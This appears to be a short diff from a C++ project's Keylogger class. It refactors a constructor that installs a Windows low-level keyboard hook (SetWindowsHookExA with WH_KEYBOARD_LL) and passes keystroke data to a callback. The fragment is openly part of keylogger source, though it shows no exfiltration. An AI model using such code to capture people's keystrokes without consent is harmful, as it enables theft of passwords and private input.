@@ -37,13 +37,7 @@ void Keylogger::SetCallback(std::function<void(PKBDLLHOOKSTRUCT)>& callback) {
 	callbackAddress = &callback;
 }
 
-Keylogger::Keylogger(std::function<void(PKBDLLHOOKSTRUCT)>& callback) {
-	if(!hookKeyboard) {
-		hookKeyboard = SetWindowsHookExA(WH_KEYBOARD_LL, ProcKeyboard, 0, 0);
-
-		hookKeyboardAddress = hookKeyboard;
-	}
-
+Keylogger::Keylogger(std::function<void(PKBDLLHOOKSTRUCT)>& callback): Keylogger() {
 	SetCallback(callback);
 }
 
